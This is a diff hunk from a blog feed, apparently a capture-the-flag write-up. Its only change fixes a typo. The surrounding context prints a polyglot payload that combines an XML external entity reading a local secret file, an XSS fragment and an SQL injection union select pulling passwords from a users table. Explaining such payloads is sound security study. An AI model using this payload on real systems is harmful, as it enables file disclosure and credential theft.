@@ -153,7 +153,7 @@ table cartesian product ;) &ndash;the result was something like this:</p>
 <div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span>
 <span class="cp">&lt;!ENTITY xxe2 SYSTEM &#34;xxe_seed&gt;</span>/*&#34;&gt;]&gt;<span class="nt">&lt;r&gt;</span>*/xss=true;//<span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
 <span class="c">&lt;!--&#39; union select password, 1, 1, 1 from users limit 1;#--&gt;</span>
-</code></pre></div><p>Note: it needs to be all one one line, but I broke it up for visibility.</p>
+</code></pre></div><p>Note: it needs to be all on one line, but I broke it up for visibility.</p>
 ]]></content>
 		</item>
 		
